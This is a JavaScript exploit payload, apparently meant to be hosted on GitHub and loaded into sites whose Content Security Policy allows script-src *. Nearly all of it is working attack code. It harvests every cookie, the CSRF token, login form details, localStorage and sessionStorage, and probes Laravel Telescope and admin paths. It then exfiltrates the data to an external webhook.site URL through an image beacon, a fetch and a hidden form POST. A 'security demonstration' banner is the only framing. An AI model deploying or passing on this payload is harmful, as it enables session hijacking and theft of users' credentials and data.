// FINAL WORKING EXPLOIT - Update your GitHub with this
(function() {
  console.log('üéØ CSP script-src * Exploit - Active');
  
  const WEBHOOK = 'https://webhook.site/701e5e4d-dc48-4c08-936a-46abb07b1b77';
  
  // Collect ALL sensitive data
  const exploitData = {
    // Basic info
    target: window.location.href,
    domain: document.domain,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    
    // CSP Analysis
    csp: {
      header: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || '',
      hasScriptSrcStar: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content?.includes('script-src *') || false,
      hasSyntaxError: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content?.includes('https//') || false
    },
    
    // Authentication Data (CRITICAL)
    authentication: {
      // Session cookies
      cookies: document.cookie.split(';').reduce((obj, c) => {
        const [k, v] = c.split('=').map(s => s.trim());
        if (k && v) obj[k] = v;
        return obj;
      }, {}),
      
      // CSRF token
      csrfToken: document.querySelector('input[name="_token"]')?.value || 'not found',
      
      // Form data
      loginForm: {
        action: document.querySelector('form[action*="login"]')?.action || '',
        method: document.querySelector('form[action*="login"]')?.method || '',
        usernameField: document.querySelector('input[name="username"]')?.name || '',
        passwordField: document.querySelector('input[type="password"]')?.name || ''
      },
      
      // Storage
      localStorage: {},
      sessionStorage: {}
    },
    
    // Application Discovery
    discovery: {
      telescope: 'not tested yet',
      adminEndpoints: [],
      apiEndpoints: []
    },
    
    // Vulnerabilities
    vulnerabilities: []
  };
  
  // Add CSS without inline styles
  const style = document.createElement('style');
  style.textContent = `
    .csp-exploit-ui {
      position: fixed !important;
      bottom: 20px !important;
      right: 20px !important;
      width: 350px !important;
      background: #1a1a2e !important;
      color: white !important;
      padding: 15px !important;
      border-radius: 10px !important;
      z-index: 2147483647 !important;
      font-family: Arial, sans-serif !important;
      border: 2px solid #ff4757 !important;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5) !important;
    }
    .csp-exploit-header {
      display: flex !important;
      align-items: center !important;
      margin-bottom: 10px !important;
    }
    .csp-exploit-icon {
      font-size: 24px !important;
      margin-right: 10px !important;
    }
    .csp-exploit-title {
      font-weight: bold !important;
    }
    .csp-exploit-subtitle {
      font-size: 11px !important;
      opacity: 0.8 !important;
    }
    .csp-exploit-status {
      font-size: 12px !important;
      margin-bottom: 10px !important;
      min-height: 20px !important;
    }
    .csp-exploit-progress {
      height: 4px !important;
      background: rgba(255,255,255,0.1) !important;
      border-radius: 2px !important;
      margin: 10px 0 !important;
      overflow: hidden !important;
    }
    .csp-exploit-progress-fill {
      height: 100% !important;
      background: #00d4ff !important;
      width: 0% !important;
      border-radius: 2px !important;
      transition: width 0.3s !important;
    }
  `;
  document.head.appendChild(style);
  
  // Create UI
  const ui = document.createElement('div');
  ui.className = 'csp-exploit-ui';
  ui.innerHTML = `
    <div class="csp-exploit-header">
      <div class="csp-exploit-icon">üîì</div>
      <div>
        <div class="csp-exploit-title">CSP Security Exploit</div>
        <div class="csp-exploit-subtitle">script-src * vulnerability demonstration</div>
      </div>
    </div>
    <div id="csp-status" class="csp-exploit-status">Initializing exploit...</div>
    <div class="csp-exploit-progress">
      <div id="csp-progress" class="csp-exploit-progress-fill"></div>
    </div>
    <div style="font-size: 11px; opacity: 0.7; margin-top: 10px;">
      This is a security demonstration
    </div>
  `;
  document.body.appendChild(ui);
  
  function updateStatus(text, percent = 0) {
    const status = document.getElementById('csp-status');
    const progress = document.getElementById('csp-progress');
    if (status) status.textContent = text;
    if (progress) progress.style.width = percent + '%';
    console.log(`[${percent}%] ${text}`);
  }
  
  // Main exploit function
  async function executeExploit() {
    updateStatus('Analyzing CSP policy...', 10);
    
    // Check CSP vulnerabilities
    if (exploitData.csp.hasScriptSrcStar) {
      exploitData.vulnerabilities.push('CSP_SCRIPT_SRC_STAR');
      updateStatus('üö® CRITICAL: CSP has script-src *', 20);
    }
    
    if (exploitData.csp.hasSyntaxError) {
      exploitData.vulnerabilities.push('CSP_SYNTAX_ERROR');
      updateStatus('‚ö†Ô∏è CSP has syntax error (https//)', 25);
    }
    
    // Check Telescope
    updateStatus('Testing Laravel Telescope...', 30);
    try {
      const telescopeRes = await fetch('/telescope');
      exploitData.discovery.telescope = telescopeRes.ok ? 'accessible' : 'not accessible';
      if (telescopeRes.ok) {
        exploitData.vulnerabilities.push('TELESCOPE_NO_AUTH');
        updateStatus('‚úÖ Telescope accessible without auth!', 35);
      } else {
        updateStatus('Telescope not accessible', 35);
      }
    } catch(e) {
      exploitData.discovery.telescope = 'error: ' + e.message;
      updateStatus('Telescope check failed', 35);
    }
    
    // Check admin endpoints
    updateStatus('Discovering internal endpoints...', 40);
    const endpoints = ['/admin', '/dashboard', '/api', '/manager'];
    for (const endpoint of endpoints) {
      try {
        const res = await fetch(endpoint, { method: 'HEAD' });
        if (res.status !== 404) {
          exploitData.discovery.adminEndpoints.push({
            endpoint,
            status: res.status,
            accessible: res.ok
          });
        }
      } catch(e) {}
    }
    
    updateStatus('Collecting authentication data...', 60);
    
    // Collect storage data
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        exploitData.authentication.localStorage[key] = localStorage.getItem(key);
      }
    } catch(e) {}
    
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        exploitData.authentication.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch(e) {}
    
    updateStatus('Preparing data exfiltration...', 80);
    
    // Send to webhook using multiple methods
    const sendData = async () => {
      const dataStr = JSON.stringify(exploitData, null, 2);
      
      // Method 1: Image beacon (always works)
      const img = new Image();
      const query = new URLSearchParams({
        exploit: 'csp_script_src_star',
        target: exploitData.domain,
        time: Date.now(),
        data: btoa(dataStr.substring(0, 2000)) // Base64 encode
      }).toString();
      img.src = `${WEBHOOK}?${query}`;
      
      // Method 2: Fetch with no-cors
      try {
        await fetch(WEBHOOK, {
          method: 'POST',
          mode: 'no-cors',
          body: dataStr
        });
      } catch(e) {}
      
      // Method 3: Form submit
      const form = document.createElement('form');
      form.action = WEBHOOK;
      form.method = 'POST';
      form.target = '_blank';
      form.style.display = 'none';
      const input = document.createElement('input');
      input.name = 'data';
      input.value = dataStr;
      form.appendChild(input);
      document.body.appendChild(form);
      form.submit();
      setTimeout(() => form.remove(), 1000);
    };
    
    await sendData();
    
    updateStatus('‚úÖ Exploit completed! Data sent.', 100);
    
    // Show summary
    console.group('üéØ EXPLOIT RESULTS');
    console.log('Target:', exploitData.target);
    console.log('CSP Vulnerabilities:', exploitData.vulnerabilities);
    console.log('Cookies found:', Object.keys(exploitData.authentication.cookies).length);
    console.log('CSRF Token:', exploitData.authentication.csrfToken ? 'EXPOSED' : 'Not found');
    console.log('Telescope:', exploitData.discovery.telescope);
    console.log('Internal endpoints:', exploitData.discovery.adminEndpoints.length);
    console.groupEnd();
    
    // Create warning banner
    setTimeout(() => {
      const warning = document.createElement('div');
      warning.innerHTML = `
        <div style="
          position: fixed;
          top: 10px;
          left: 50%;
          transform: translateX(-50%);
          background: linear-gradient(90deg, #ff4757, #ff6b81);
          color: white;
          padding: 10px 20px;
          border-radius: 5px;
          z-index: 2147483646;
          font-family: Arial, sans-serif;
          font-weight: bold;
          text-align: center;
          box-shadow: 0 5px 20px rgba(255,71,87,0.3);
        ">
          üîì SECURITY VULNERABILITY DEMONSTRATED: CSP script-src *
        </div>
      `;
      document.body.appendChild(warning);
      
      // Remove after 5 seconds
      setTimeout(() => warning.remove(), 5000);
    }, 1000);
  }
  
  // Start exploit
  setTimeout(executeExploit, 1000);
  
})();
